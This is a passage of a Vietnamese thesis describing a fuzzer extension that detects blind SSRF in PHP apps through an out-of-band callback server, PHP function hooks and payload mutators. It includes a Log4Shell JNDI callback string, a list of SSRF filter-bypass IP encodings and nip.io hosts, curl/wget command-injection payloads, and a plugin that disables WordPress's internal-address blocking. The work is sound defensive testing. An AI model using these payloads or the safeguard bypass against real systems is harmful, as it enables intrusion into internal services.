\label{subsec:ssrf-php}

PHP có những đặc điểm ngôn ngữ khiến SSRF đặc biệt phổ biến trong hệ sinh
thái này~\cite{phpgroup2023history}.

\textbf{Stream wrappers.} PHP triển khai một hệ thống \emph{stream wrapper}
cho phép nhiều giao thức khác nhau được truy cập qua cùng một API file I/O.
Khi \texttt{file\_get\_contents(\$url)} được gọi, PHP tự động chọn wrapper
phù hợp dựa trên scheme của URL: \texttt{http://} dùng HTTP wrapper,
\texttt{ftp://} dùng FTP wrapper, \texttt{file://} dùng file wrapper,
\texttt{php://} dùng built-in PHP stream. Điều này có nghĩa là mọi hàm I/O
của PHP --- không chỉ các hàm cURL chuyên dụng --- đều tiềm ẩn nguy cơ SSRF
khi nhận input không được kiểm tra.

\textbf{WordPress HTTP API.} WordPress cung cấp \texttt{wp\_remote\_get()},
\texttt{wp\_remote\_post()}, \texttt{wp\_remote\_request()} như một abstraction
layer trên cURL. Hàng nghìn plugin WordPress dùng các hàm này để tích hợp
dịch vụ bên ngoài; nếu tham số URL có thể bị kiểm soát bởi input người dùng
(dù gián tiếp), SSRF có thể xảy ra. Do nằm ở tầng framework cao, các hàm
này thường bị bỏ sót trong các công cụ SSRF analysis vốn chỉ hook tầng
cURL/PHP gốc.

\textbf{Non-obvious sinks.} Ngoài các hàm HTTP rõ ràng, nhiều hàm PHP ít được
chú ý cũng thực hiện network request ngầm khi nhận URL:
\texttt{getimagesize(\$url)}, \texttt{exif\_read\_data(\$url)},
\texttt{get\_headers(\$url)}, \texttt{SimpleXML::load(\$url)},
\texttt{DOMDocument::load(\$url)}, \texttt{SoapClient::\_\_construct()} (WSDL
endpoint). Ví dụ: nhiều ứng dụng cho phép người dùng nhập URL ảnh đại diện,
rồi gọi \texttt{getimagesize(\$url)} để kiểm tra kích thước ảnh trước khi
tải về --- đây là SSRF sink không hiển nhiên.

\subsection{Thách thức Phát hiện Blind SSRF trong Fuzzing Tự động}

Blind SSRF đặt ra thách thức cơ bản cho mọi công cụ fuzzing, bao gồm cả
greybox fuzzer như Phuzz:

\begin{enumerate}
    \item \textbf{HTTP response không có tín hiệu}: Response trả về bình
    thường --- không có exception, không có thay đổi status code, không có
    nội dung bất thường. Mọi VulnChecker dựa trên phân tích response đều
    không phát hiện được gì.
    \item \textbf{Coverage không phân biệt được}: Khi
    \texttt{file\_get\_contents(\$url)} được gọi với URL hợp lệ hay URL SSRF,
    code path thực thi là hoàn toàn như nhau --- fuzzer không có cơ sở từ
    độ phủ mã để nhận biết một network request bất thường đã xảy ra.
    \item \textbf{Hành vi bất đồng bộ}: Request SSRF có thể được đẩy vào
    background job (queue worker, cron job), tức kết quả không xuất hiện
    trong response của request gốc mà xảy ra sau đó nhiều giây hoặc nhiều
    phút.
    \item \textbf{Bằng chứng chỉ có ở kênh ngoài}: Dấu hiệu duy nhất của
    Blind SSRF là việc một máy chủ ngoài \emph{nhận được kết nối} từ máy
    chủ ứng dụng --- thông tin này không bao giờ nằm trong luồng HTTP thông
    thường giữa fuzzer và ứng dụng.
\end{enumerate}

Những hạn chế này dẫn đến kết luận: cần một kênh tín hiệu \emph{ngoài băng}
(out-of-band) độc lập để phát hiện Blind SSRF một cách đáng tin cậy.
Phần~\ref{sec:oob} trình bày kỹ thuật giải quyết vấn đề này.

% ============================================================
\section{Kỹ thuật Out-of-Band (OOB)}
\label{sec:oob}
% ============================================================

\subsection{Khái niệm và Bối cảnh}

Tương tác Out-of-Band (OOB) là kỹ thuật mà trong đó ứng dụng bị kiểm thử
được kích hoạt để \emph{chủ động liên lạc} tới một máy chủ lắng nghe
(\emph{OOB server} hay \emph{interaction server}) do kiểm thử viên kiểm soát,
qua một kênh mạng hoàn toàn độc lập với kênh HTTP chính đang kiểm thử. Thay
vì chờ ứng dụng trả về dấu hiệu lỗi, kỹ thuật OOB lắng nghe các kết nối
\emph{đến từ} ứng dụng mục tiêu.

Kỹ thuật này được sử dụng rộng rãi trong kiểm thử thủ công, điển hình là
Burp Suite Collaborator~\cite{portswigger2023burp}: một dịch vụ cloud cung
cấp các subdomain và địa chỉ IP dùng một lần để phát hiện blind interaction.
Burp Collaborator giải quyết ba lớp OOB: DNS (domain lookup), HTTP (HTTP
request), và SMTP (email). Khi payload gây ra bất kỳ tương tác nào với server
Collaborator, Burp Suite ghi nhận và báo cáo.

Trong lĩnh vực nghiên cứu bảo mật, kỹ thuật OOB đã được ứng dụng để phát
hiện nhiều lớp lỗ hổng ``blind'' khác nhau:
\begin{itemize}
    \item \textbf{Blind SSRF}: Phát hiện qua HTTP/DNS callback từ server.
    \item \textbf{Blind XXE}: Entity trong XML file trỏ về OOB server; khi
    XML parser resolve external entity, callback được ghi nhận.
    \item \textbf{Blind SQLi}: Một số database hỗ trợ DNS lookup trong query
    (MySQL \texttt{LOAD\_FILE}, MSSQL \texttt{xp\_dirtree}) để exfiltrate
    dữ liệu qua DNS.
    \item \textbf{Log4Shell (CVE-2021-44228)}: JNDI lookup \texttt{\$\{jndi:
    ldap://oob-server/\}} trong Java logging framework; OOB server nhận
    LDAP/DNS request xác nhận code path bị ảnh hưởng.
\end{itemize}

\subsection{Cơ chế Token-Based Correlation}
\label{subsec:oob-token}

Thách thức cốt lõi khi dùng OOB trong fuzzing tự động là \emph{tương quan
nhân quả} (causal correlation): khi OOB server nhận một kết nối, phải xác
định chính xác đó là callback từ request fuzz nào trong số hàng nghìn request
đang gửi song song. Cơ chế giải quyết là token-based correlation:

\begin{enumerate}
    \item Fuzzer sinh một \emph{token} ngẫu nhiên (chuỗi alphanumeric 8 ký
    tự) duy nhất cho mỗi lần đột biến, lưu vào bảng \texttt{token\_map}.
    \item Token được nhúng vào payload SSRF dưới dạng URL path hoặc subdomain:
    \texttt{http://<oob-server>/<token>} hoặc
    \texttt{http://<token>.<oob-domain>/}.
    \item Khi ứng dụng mục tiêu thực hiện HTTP/DNS request tới địa chỉ trên,
    OOB server ghi nhận callback cùng với token và thời gian.
    \item Fuzzer tra cứu \texttt{token\_map}: nếu tìm thấy log callback khớp
    token của ứng viên, ứng viên đó được xác nhận là SSRF.
\end{enumerate}

Cơ chế này đảm bảo \emph{zero false positive}: một ứng viên chỉ được báo cáo
là SSRF khi có bằng chứng mạng thực tế (kết nối vật lý đến OOB server),
không phụ thuộc vào heuristic hay pattern matching trên response.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sequence diagram cơ chế OOB token-based correlation (5 thực thể theo chiều dọc).
    % Các thực thể (cột từ trái qua phải):
    %   Fuzzer | phuzz-web (PHP) | phuzz-oob (OOB Server) | shared-tmpfs | SSRFVulnCheck
    % Luồng thông điệp (mũi tên ngang):
    %   1. Fuzzer → Fuzzer: sinh token "ab12cd34", lưu token_map[token]=timestamp.
    %   2. Fuzzer → phuzz-web: HTTP POST url="http://172.20.0.10:8000/ab12cd34"
    %                           [X-Fuzzer-Covid: req-001].
    %   3. phuzz-web → phuzz-web: PHP hook kích hoạt, ghi ssrf-hooks/req-001.json.
    %   4. phuzz-web → phuzz-oob: HTTP GET /ab12cd34 (PHP thực sự gọi file_get_contents).
    %   5. phuzz-oob → shared-tmpfs: ghi oob-logs/ab12cd34.json.
    %   6. phuzz-web → Fuzzer: HTTP 200 OK (response bình thường).
    %   7. Fuzzer → SSRFVulnCheck: check(candidate req-001).
    %   8. SSRFVulnCheck → shared-tmpfs: đọc ssrf-hooks/req-001.json → token="ab12cd34".
    %   9. SSRFVulnCheck → shared-tmpfs: đọc oob-logs/ab12cd34.json → tồn tại!
    %   10. SSRFVulnCheck → Fuzzer: return True (SSRF xác nhận).
    \includegraphics[width=0.92\textwidth]{figures/fig-oob-token-flow}
    \caption{Cơ chế tương quan token trong phát hiện Blind SSRF.}
    \label{fig:oob-token-flow}
\end{figure}

\subsection{So sánh Các Giao thức OOB}
\label{subsec:oob-protocols}

Có ba giao thức chính thường dùng cho OOB interaction, mỗi giao thức có
đặc điểm về triển khai, khả năng vượt egress filter, và phù hợp với loại
lỗ hổng khác nhau:

\begin{table}[h]
\centering
\caption{So sánh các giao thức OOB interaction}
\label{tab:oob-protocols}
\begin{tabular}{|l|p{3.2cm}|p{3.2cm}|p{3.2cm}|}
\hline
\textbf{Tiêu chí}
    & \textbf{DNS OOB}
    & \textbf{HTTP OOB}
    & \textbf{SMTP OOB} \\
\hline
Vượt egress filter
    & Tốt nhất (port 53 UDP thường mở)
    & Tốt (port 80/443)
    & Kém (port 25 thường bị chặn)  \\
\hline
Hạ tầng
    & Phức tạp (cần wildcard DNS authority)
    & Đơn giản (HTTP server + dnsmasq)
    & Phức tạp (SMTP server)  \\
\hline
Token trong payload
    & Subdomain: \texttt{<tok>.oob.}
    & URL path: \texttt{/<tok>}
    & Header/body  \\
\hline
Metadata ghi được
    & Ít (IP, timestamp)
    & Nhiều (IP, method, headers, path, body)
    & Vừa  \\
\hline
Phù hợp với
    & Mọi lớp lỗ hổng blind
    & SSRF, XXE, blind RCE
    & Phishing, account takeover  \\
\hline
Phù hợp tích hợp tự động
    & Trung bình
    & Tốt nhất
    & Kém  \\
\hline
\end{tabular}
\end{table}

Với bối cảnh tích hợp vào fuzzing tự động trong môi trường Docker, HTTP OOB
là lựa chọn phù hợp nhất: dễ triển khai, ghi log chi tiết, token nằm trong
URL path giúp tương quan dễ dàng, và các container giao tiếp nhau qua mạng
bridge mà không cần đi ra Internet. Hệ thống đề xuất trong khóa luận này bổ
sung thêm DNS OOB (qua dnsmasq wildcard) để tăng khả năng bypass egress
filter trong các môi trường chặt chẽ hơn.

\subsection{OOB như Kênh Phản hồi Bổ sung trong Fuzzing}

Trong kiến trúc fuzzing, kênh OOB đóng vai trò là \emph{kênh phản hồi thứ
ba}, song song và bổ sung cho hai kênh truyền thống:

\begin{itemize}
    \item \textbf{Kênh HTTP response}: Phân tích status code, headers, body
    để phát hiện lỗ hổng có dấu hiệu trong response (XSS, SQLi lỗi cú pháp,
    path traversal trả về nội dung file).
    \item \textbf{Kênh coverage}: Theo dõi code path được thực thi để điều
    hướng fuzzer khám phá code mới; không phân biệt được loại hành vi bên
    trong code path.
    \item \textbf{Kênh OOB}: Ghi nhận network callback từ ứng dụng, cho phép
    phát hiện các hành vi mạng mà hai kênh trên không thể quan sát.
\end{itemize}

Điểm mấu chốt là kênh OOB hoàn toàn \emph{độc lập} với ứng dụng mục tiêu
--- nó không yêu cầu thay đổi ứng dụng, không phụ thuộc vào error handling
của ứng dụng, và hoạt động ngay cả khi ứng dụng cố tình che giấu lỗi hoặc
xử lý request SSRF trong background.

\subsection{Xử lý Tính Bất đồng bộ}
\label{subsec:oob-async}

Một thách thức quan trọng trong tích hợp OOB vào fuzzing là tính bất đồng bộ
của callback: khi fuzzer nhận HTTP response từ ứng dụng, ứng dụng có thể đã
thực hiện OOB call đồng bộ trong request handler, hoặc đẩy call vào background
job và xử lý sau.

Để không bỏ sót trường hợp thứ hai, hệ thống trong khóa luận này áp dụng
chiến lược hai giai đoạn:
\begin{enumerate}
    \item \textbf{Kiểm tra tức thì}: Sau khi nhận HTTP response, tra cứu
    OOB log ngay lập tức để bắt các callback đồng bộ.
    \item \textbf{Token map với TTL}: Token không bị xóa ngay sau kiểm tra;
    chúng được giữ lại trong \texttt{token\_map} trong suốt phiên fuzz. OOB
    log có thể được quét lại theo định kỳ để bắt callback trễ từ background
    job.
\end{enumerate}

Chiến lược này đảm bảo cả Blind SSRF đồng bộ và bất đồng bộ đều được phát
hiện mà không đưa ra false positive.

% ============================================================
\section{Kiến trúc Tổng quan}
\label{sec:arch}
% ============================================================

\subsection{Môi trường Triển khai}

Toàn bộ hệ thống được đóng gói trong môi trường Docker~\cite{docker2023}
và khởi chạy bằng một file \texttt{docker-compose.ssrf.yml} duy nhất. Môi
trường gồm bốn container:

\begin{itemize}
    \item \textbf{phuzz-oob} --- Máy chủ OOB; chạy hai tiến trình song song
    qua \texttt{supervisord}: dnsmasq (phân giải DNS) và Flask HTTP listener.
    Container được gán địa chỉ IP tĩnh \texttt{172.20.0.10} trong mạng nội bộ.
    \item \textbf{phuzz-db} --- Cơ sở dữ liệu MySQL 8 dùng chung cho ứng dụng
    mục tiêu.
    \item \textbf{phuzz-web} --- Container PHP/Apache chứa ứng dụng mục tiêu
    được instrument; dùng \texttt{phuzz-oob} làm DNS server.
    \item \textbf{phuzz-fuzzer} --- Container fuzzer; chạy script
    \texttt{fuzzer.py} với \texttt{SSRFMutator} và \texttt{SSRFVulnCheck} được
    tích hợp.
\end{itemize}

\subsection{Mạng Docker}

Cả bốn container chia sẻ một Docker bridge network tên \texttt{phuzz-net}
với subnet cố định \texttt{172.20.0.0/24}. Việc cố định subnet là điều kiện
bắt buộc để hai cơ chế sau hoạt động:

\begin{enumerate}
    \item \textbf{IP tĩnh OOB server}: \texttt{phuzz-oob} phải có IP cố định
    \texttt{172.20.0.10} để các payload IP-based trong
    \texttt{SSRFMutator} luôn trỏ đúng địa chỉ, kể cả các biến thể
    mã hóa (decimal \texttt{2886795274}, hex \texttt{0xac14000a}, octal
    \texttt{0254.024.0.012}).
    \item \textbf{DNS *.oob}: \texttt{phuzz-web} được cấu hình
    \texttt{dns: [172.20.0.10]} để sử dụng \texttt{phuzz-oob} làm nameserver.
    dnsmasq trên \texttt{phuzz-oob} trả lời mọi truy vấn \texttt{*.oob} về
    \texttt{172.20.0.10}, cho phép payload dạng
    \texttt{http://<token>.oob:8000/} được phân giải đúng.
\end{enumerate}

\subsection{Shared Volume và Luồng Dữ liệu}

Hai Docker volume kiểu tmpfs làm kênh giao tiếp giữa các container:

\begin{itemize}
    \item \textbf{shared-tmpfs} (512 MB) được mount vào cả ba container
    \texttt{phuzz-oob}, \texttt{phuzz-web}, \texttt{phuzz-fuzzer}.
    Bảng~\ref{tab:tmpfs} liệt kê các thư mục con.
    \item \textbf{sync-tmpfs} (256 MB) dùng để đồng bộ tập ứng viên giữa
    nhiều instance fuzzer chạy song song.
\end{itemize}

\begin{table}[h]{Cấu trúc thư mục trên \texttt{shared-tmpfs}}
\label{tab:tmpfs}
\centering
\begin{tabular}{|l|l|l|}
\hline
\textbf{Thư mục} & \textbf{Người ghi} & \textbf{Người đọc} \\
\hline
\texttt{coverage-reports/}    & phuzz-web (PHP)      & phuzz-fuzzer \\
\texttt{ssrf-hooks/}          & phuzz-web (PHP hook) & phuzz-fuzzer \\
\texttt{oob-logs/}            & phuzz-oob (Flask)    & phuzz-fuzzer \\
\texttt{ssrf-error-reports/}  & phuzz-fuzzer         & phuzz-fuzzer \\
\hline
\end{tabular}
\end{table}

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sơ đồ kiến trúc 4-container Docker của hệ thống đề xuất.
    % Hình chữ nhật lớn bên ngoài: Docker network "phuzz-net" (172.20.0.0/24).
    % Bên trong: 4 container dạng hộp màu khác nhau:
    %   - phuzz-fuzzer (172.20.0.x): "Fuzzer (Python)" — SSRFMutator, SSRFVulnCheck,
    %     vòng lặp fuzz chính. Nối với phuzz-web qua HTTP.
    %   - phuzz-web (172.20.0.y): "Web Container (PHP 8.x + Apache)" — ứng dụng
    %     mục tiêu, 08_ssrf.php hook, PCOV/Xdebug coverage. Nối phuzz-db qua MySQL.
    %   - phuzz-oob (172.20.0.10): "OOB Server" — Flask HTTP:8000 + HTTPS:8443,
    %     dnsmasq (*.oob → 172.20.0.10). Viền màu đỏ/cam để nổi bật.
    %   - phuzz-db (172.20.0.z): "MySQL 8".
    % Kết nối:
    %   fuzzer ↔ web: HTTP request / X-Fuzzer-Covid header.
    %   web → oob: OOB callback (khi ứng dụng gọi file_get_contents(SSRF_URL)).
    %   web → db: SQL queries.
    % Hình trụ "shared-tmpfs (512 MB)" nối fuzzer ↔ web ↔ oob (3 container đọc/ghi).
    % Hình trụ "sync-tmpfs (256 MB)" nối các fuzzer instance song song.
    \includegraphics[width=0.90\textwidth]{figures/fig-system-arch}
    \caption{Kiến trúc tổng quan hệ thống đề xuất.}
    \label{fig:system-arch}
\end{figure}

\subsection{Thứ tự Khởi động}

\texttt{phuzz-oob} và \texttt{phuzz-db} khởi động trước; \texttt{phuzz-web}
chỉ được coi là \textit{healthy} khi file \texttt{/shared-tmpfs/web-paths.txt}
tồn tại (script \texttt{entrypoint.sh} chạy \texttt{find /var/www/html} và
ghi ra file này sau khi hoàn tất rsync ứng dụng). \texttt{phuzz-fuzzer} đợi
\texttt{phuzz-web} qua \texttt{condition: service\_healthy} trước khi bắt đầu
vòng lặp fuzz.

% ============================================================
\section{Hook Hàm PHP}
\label{sec:hook-impl}
% ============================================================

\subsection{Cơ chế Tải Hook}

Hook được đặt trong file \texttt{08\_ssrf.php} thuộc thư mục
\texttt{instrumentation/overrides.d/} và được load tự động qua cơ chế
\texttt{auto\_prepend\_file} của PHP. Nhờ đó, \texttt{08\_ssrf.php} được
thực thi trước bất kỳ code ứng dụng nào, đảm bảo hook luôn sẵn sàng từ
đầu mỗi request. Cơ chế \texttt{auto\_prepend\_file} này là thành phần
instrumentation sẵn có của Phuzz~\cite{neef2024phuzz} --- khóa luận chỉ
thêm file hook SSRF vào thư mục \texttt{overrides.d/} mà không cần sửa
đổi hạ tầng instrumentation gốc.

Hằng số \texttt{\_\_FUZZER\_\_COVID} (được inject bởi instrumentation
framework Phuzz từ header \texttt{X-Fuzzer-Covid}) được dùng làm tên file
log, đảm bảo mỗi hook log khớp chính xác với request mà fuzzer đã gửi.

\subsection{Nhận diện OOB Payload}

Hàm \texttt{\_\_fuzzer\_\_ssrf\_is\_oob()} kiểm tra xem đối số truyền vào
một hàm mạng có chứa định danh OOB hay không. Hàm này được thiết kế để bao
phủ toàn bộ 21 biến thể payload của \texttt{SSRFMutator} (xem
Phần~\ref{sec:mutator-impl}):

\begin{verbatim}
function __fuzzer__ssrf_is_oob(string $value): bool {
    static $needles = null;
    if ($needles === null) {
        $needles = [
            '172.20.0.10',   // plain IP (và trailing-dot, userinfo, fragment)
            '2886795274',    // decimal IP
            '0xac14000a',    // hex IP
            '0254.024.0.012',// octal IP
            '::ffff:ac14',   // IPv6 mapped hex
            '.oob:',         // DNS *.oob (http://<token>.oob:8000)
            '.oob/',         // DNS *.oob (path)
            '.nip.io',       // nip.io bypass
            '.sslip.io',     // sslip.io bypass
            'oob.phuzz',     // hostname bypass (extra_hosts)
        ];
    }
    $lower = strtolower($value);
    foreach ($needles as $needle) {
        if (strpos($lower, $needle) !== false) {
            return true;
        }
    }
    return false;
}
\end{verbatim}

Việc dùng \texttt{strpos} với \texttt{strtolower} đảm bảo cả biến thể
\texttt{HTTP://} (mixed-case scheme, variant 10) cũng được nhận diện chính
xác.

\subsection{Ghi Log SSRF Hook}

Khi \texttt{\_\_fuzzer\_\_ssrf\_is\_oob()} trả về \texttt{true}, hàm
\texttt{\_\_fuzzer\_\_ssrf\_log()} ghi một JSON entry vào thư mục
\texttt{/shared-tmpfs/ssrf-hooks/}:

\begin{verbatim}
function __fuzzer__ssrf_log(string $function, string $argument): void {
    $path = __FUZZER__SSRF_HOOKS_PATH . __FUZZER__COVID . '.json';
    if (file_exists($path)) { return; }  // first-write-wins
    $entry = json_encode([
        'function'  => $function,
        'argument'  => $argument,
        'timestamp' => time(),
    ]);
    file_put_contents($path, $entry);
    chmod($path, 0777);
}
\end{verbatim}

Chiến lược \textit{first-write-wins} (kiểm tra \texttt{file\_exists} trước
khi ghi) đảm bảo chỉ lần kích hoạt đầu tiên trong một request được ghi lại,
tránh ghi đè bởi các lần gọi hàm tiếp theo trong cùng request.

\subsection{Danh sách Hook}

Hệ thống cài đặt tổng cộng 23 hook qua
\texttt{uopz\_set\_hook}~\cite{phpgroup2023uopz} trên năm nhóm hàm,
tổng hợp trong Bảng~\ref{tab:php-hooks}.

\begin{table}[h]{Danh sách hook PHP theo nhóm chức năng}
\label{tab:php-hooks}
\centering
\small
\begin{tabular}{|l|l|p{4.2cm}|}
\hline
\textbf{Hàm PHP} & \textbf{Đối số kiểm tra} & \textbf{Ghi chú} \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm Network/HTTP (7 hàm)}} \\
\hline
\texttt{file\_get\_contents}  & \texttt{\$filename}  & Sink phổ biến nhất \\
\texttt{fopen}                & \texttt{\$filename}  & \\
\texttt{readfile}             & \texttt{\$filename}  & \\
\texttt{file}                 & \texttt{\$filename}  & \\
\texttt{get\_headers}         & \texttt{\$url}       & \\
\texttt{get\_meta\_tags}      & \texttt{\$url}       & \\
\texttt{getimagesize}         & \texttt{\$filename}  & Sink ẩn (image fetch) \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm cURL (3 hàm)}} \\
\hline
\texttt{curl\_exec}           & \texttt{curl\_getinfo(\$ch)['url']} & Đọc URL từ handle \\
\texttt{curl\_setopt}         & \texttt{\$value} khi \texttt{\$option=CURLOPT\_URL} & Bắt khi setopt \\
\texttt{curl\_multi\_exec}    & (qua \texttt{curl\_setopt})          & Hook phụ \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm Sockets (3 hàm)}} \\
\hline
\texttt{fsockopen}            & \texttt{\$hostname}  & \\
\texttt{pfsockopen}           & \texttt{\$hostname}  & \\
\texttt{stream\_socket\_client} & \texttt{\$address} & \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm Shell Execution (5 hàm) — CmdInj → SSRF}} \\
\hline
\texttt{shell\_exec}          & \texttt{\$cmd}       & \\
\texttt{system}               & \texttt{\$cmd}       & \\
\texttt{exec}                 & \texttt{\$cmd}       & \\
\texttt{passthru}             & \texttt{\$cmd}       & \\
\texttt{popen}                & \texttt{\$cmd}       & \\
\hline
\multicolumn{3}{|l|}{\textit{Nhóm WordPress Wrappers (5 hàm) — chỉ đăng ký khi WP được phát hiện}} \\
\hline
\texttt{wp\_remote\_get}       & \texttt{\$url}      & \\
\texttt{wp\_remote\_post}      & \texttt{\$url}      & \\
\texttt{wp\_remote\_request}   & \texttt{\$url}      & \\
\texttt{wp\_safe\_remote\_get} & \texttt{\$url}      & \\
\texttt{wp\_safe\_remote\_post}& \texttt{\$url}      & \\
\hline
\end{tabular}
\end{table}

Nhóm Shell Execution bao phủ kịch bản \texttt{CmdInjectionSSRFMutator}
chèn lệnh \texttt{curl}/\texttt{wget} vào đối số shell. Nhóm WordPress
chỉ được đăng ký khi \texttt{function\_exists('wp\_remote\_get')} trả về
\texttt{true}, tránh lỗi runtime trên môi trường PHP standalone.

\subsection{WordPress mu-plugin Bypass}

WordPress có cơ chế \texttt{WP\_HTTP::block\_request()} chặn mọi HTTP request
tới địa chỉ IP nội bộ theo RFC 1918 nhằm ngăn chặn SSRF. Trong môi trường
fuzzing, cơ chế này lại cản trở việc kiểm thử: nếu \texttt{wp\_remote\_get}
bị chặn trước khi thực thi, hook UOPZ sẽ không được kích hoạt và OOB server
sẽ không nhận được callback.

Để giải quyết, \texttt{entrypoint.sh} tự động cài đặt một
\textit{must-use plugin} (mu-plugin) vào thư mục
\texttt{wp-content/mu-plugins/} khi phát hiện môi trường WordPress:

\begin{verbatim}
<?php
// Fuzzer: allow WP_HTTP requests to private/internal IPs for SSRF detection
add_filter("http_request_host_is_external", "__return_true");
\end{verbatim}

Filter \texttt{http\_request\_host\_is\_external} trả về \texttt{true} vô
điều kiện, vô hiệu hóa \texttt{block\_request()} và cho phép
\texttt{wp\_remote\_get} thực sự gọi tới OOB server.

\subsection{PHP Stream Wrapper --- Phát hiện qua \texttt{include}/\texttt{require}}
\label{subsec:stream-wrapper}

\texttt{uopz\_set\_hook} hoạt động ở tầng hàm: cơ chế này chặn bắt lời
gọi tới các hàm PHP được khai báo trong bảng hàm (\textit{function table})
như \texttt{file\_get\_contents} hay \texttt{curl\_exec}. Cấu trúc ngôn
ngữ (\textit{language construct}) như \texttt{include} và
\texttt{require\_once} là thành phần cú pháp được tích hợp trực tiếp vào
Zend Engine, không tồn tại dưới dạng mục trong bảng hàm --- do đó UOPZ
không thể áp dụng hook cho chúng.

PHP cung cấp một cơ chế riêng để chặn bắt truy cập URL: \textit{stream
wrapper}. Khi PHP cần mở một URL (kể cả từ
\texttt{include("http://...")}), runtime tra cứu wrapper đã đăng ký cho
scheme tương ứng và gọi phương thức \texttt{stream\_open()} của lớp
wrapper đó. File \texttt{09\_ssrf\_stream.php} tận dụng cơ chế này bằng
cách đăng ký lớp \texttt{\_\_FuzzerSSRFStreamWrapper} thay thế wrapper
tích hợp sẵn cho cả hai scheme \texttt{http} và \texttt{https}:

\begin{verbatim}
foreach (['http', 'https'] as $scheme) {
    if (in_array($scheme, stream_get_wrappers())) {
        stream_wrapper_unregister($scheme);
        stream_wrapper_register($scheme, '__FuzzerSSRFStreamWrapper');
    }
}
\end{verbatim}

Khi \texttt{stream\_open()} được kích hoạt, wrapper kiểm tra URL bằng
hàm \texttt{\_\_fuzzer\_\_ssrf\_is\_oob()}, ghi nhận sự kiện nếu phát
hiện payload OOB, rồi thực hiện chuỗi thao tác \textit{khôi phục →
mở → đăng ký lại} để chuyển tiếp yêu cầu cho wrapper gốc xử lý, tránh
đệ quy vô hạn:

\begin{verbatim}
stream_wrapper_restore($scheme);    // tạm thời khôi phục wrapper gốc
$this->fp = @fopen($path, $mode);   // wrapper gốc thực hiện yêu cầu thực sự
stream_wrapper_unregister($scheme);
stream_wrapper_register($scheme, '__FuzzerSSRFStreamWrapper'); // đăng ký lại
\end{verbatim}

Cơ chế stream wrapper bổ sung khả năng phát hiện cho các trường hợp
Remote File Inclusion (RFI) mà hook UOPZ không xử lý được --- điển hình
là bWAPP với cấu trúc \texttt{include(\$language)} và Mutillidae với
\texttt{require\_once(\$page)}, trong đó URL do người dùng cung cấp được
nạp trực tiếp thông qua cấu trúc ngôn ngữ của PHP.

% ============================================================
\section{OOB Server}
\label{sec:oob-impl}
% ============================================================

\subsection{Kiến trúc Container}

Container \texttt{phuzz-oob} chạy hai tiến trình đồng thời được quản lý
bởi \texttt{supervisord}:

\textbf{dnsmasq.} Phân giải wildcard \texttt{*.oob} → \texttt{172.20.0.10},
cho phép các payload dạng \texttt{http://<token>.oob:8000/} của
\texttt{SSRFMutator} được ứng dụng mục tiêu phân giải đúng khi thực hiện
DNS lookup.

\textbf{Flask OOB listener.} HTTP server lắng nghe trên cổng 8000 (HTTP)
và cổng 8443 (HTTPS với self-signed certificate). Luồng HTTPS chạy trong
một Python thread riêng để không block Flask chính.

\subsection{Ghi nhận OOB Callback}

Mọi HTTP request đến container --- bất kể method (GET, POST, PUT, DELETE,
HEAD, OPTIONS, PATCH) và path --- đều được xử lý bởi một catch-all route:

\begin{verbatim}
@app.route("/<path:path>", methods=[...])
def catch_all(path: str):
    token = extract_token(request.path, request.host or "")
    if token:
        write_log(token, request.remote_addr or "unknown")
    return "", 200  # luôn trả về 200 OK
\end{verbatim}

Luôn trả về \texttt{200 OK} là thiết kế quan trọng: nếu OOB server trả về
lỗi, ứng dụng PHP có thể raise exception và che giấu tín hiệu hook SSRF.

\subsection{Trích xuất Token}

Hàm \texttt{extract\_token()} hỗ trợ hai phương thức trích xuất:

\begin{verbatim}
def extract_token(path: str, host: str = "") -> "str | None":
    first = path.strip("/").split("/")[0]
    if first:
        return first   # path-based: /abc123de → "abc123de"
    # subdomain-based: Host: abc123de.oob:8000 → "abc123de"
    if host:
        hostname = host.split(":")[0]
        if hostname.endswith(".oob"):
            subdomain = hostname.split(".")[0]
            return subdomain if subdomain else None
    return None
\end{verbatim}

Phương thức \textit{path-based} xử lý 17 trong 21 biến thể payload (IP-based,
nip.io, sslip.io, hostname-based).
Phương thức \textit{subdomain-based} xử lý 4 biến thể DNS-based còn lại
(\texttt{http://<token>.oob:8000/}).

\subsection{Ghi Log Nguyên tử}

Hàm \texttt{write\_log()} dùng mẫu \textit{write-to-temp + os.rename} để
đảm bảo file log không bao giờ ở trạng thái ghi dở:

\begin{verbatim}
def write_log(token: str, remote_ip: str) -> None:
    log_path = os.path.join(OOB_LOGS_DIR, f"{token}.json")
    if os.path.exists(log_path):
        return          # first-write-wins
    entry = json.dumps({
        "token": token, "ip": remote_ip,
        "timestamp": int(time.time()),
    })
    fd, tmp_path = tempfile.mkstemp(dir=OOB_LOGS_DIR, ...)
    with os.fdopen(fd, "w") as fh:
        fh.write(entry)
    os.chmod(tmp_path, 0o777)
    os.rename(tmp_path, log_path)   # atomic rename
\end{verbatim}

\texttt{os.rename()} trên Linux là thao tác nguyên tử tại tầng kernel đối với
cùng một filesystem, đảm bảo \texttt{VulnChecker} phía fuzzer không bao giờ
đọc file chưa hoàn chỉnh khi gọi \texttt{os.path.isfile()}.

% ============================================================
\section{Bộ đột biến SSRF}
\label{sec:mutator-impl}
% ============================================================

Hệ thống cung cấp hai mutator chuyên biệt cho phát hiện SSRF, phục vụ
hai kịch bản tấn công khác nhau.
\texttt{SSRFMutator} nhắm vào các tham số được ứng dụng dùng trực tiếp
làm URL trong lời gọi hàm mạng (sink URL-based).
\texttt{CmdInjectionSSRFMutator} nhắm vào các tham số được truyền vào
lệnh shell, khai thác lỗ hổng Command Injection để tạo ra kết nối SSRF
(sink shell-based).
Cả hai đều kế thừa \texttt{ParamMutator} và dùng chung cơ chế token
8 ký tự ghi vào \texttt{\_token\_map} để \texttt{SSRFVulnCheck} đối
chiếu tín hiệu OOB.

% ─────────────────────────────────────────────────────────────
\subsection{SSRFMutator}
% ─────────────────────────────────────────────────────────────

\texttt{SSRFMutator} sinh payload OOB theo phương pháp round-robin qua
21 biến thể. Với mỗi lần được chọn, mutator sinh một token 8 ký tự
(chữ thường + chữ số), lưu vào dict \texttt{\_token\_map} cùng
timestamp, rồi nhúng token đó vào biến thể tiếp theo trong chu kỳ:

\begin{verbatim}
@staticmethod
def _generate_token() -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choices(alphabet, k=8))
\end{verbatim}

